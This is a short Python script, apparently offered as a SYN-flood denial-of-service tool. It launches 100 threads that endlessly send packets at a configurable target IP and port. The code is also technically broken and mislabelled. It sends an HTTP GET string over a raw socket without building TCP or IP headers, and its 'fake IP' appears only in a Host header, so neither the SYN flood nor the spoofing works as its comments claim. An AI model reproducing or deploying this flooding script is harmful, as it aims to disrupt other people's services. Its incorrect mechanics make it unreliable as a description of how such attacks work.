import socket
import random
import threading

# Target IP and port
target_ip = '192.168.1.1'  # Replace with the target IP address
target_port = 80           # Replace with the target port

# Function to perform SYN flood attack
def syn_flood():
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        # Construct a fake IP address for the source
        fake_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
        
        # Prepare the packet
        packet = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {fake_ip}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode('ascii')

        # Send SYN packets
        while True:
            sock.sendto(packet, (target_ip, target_port))
            print(f"Sent packet from fake IP {fake_ip} to {target_ip}:{target_port}")

    except Exception as e:
        print(f"Error: {e}")

# Number of threads to create
num_threads = 100

# Create and start threads
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=syn_flood)
    thread.start()
    threads.append(thread)

# Join threads
for thread in threads:
    thread.join()
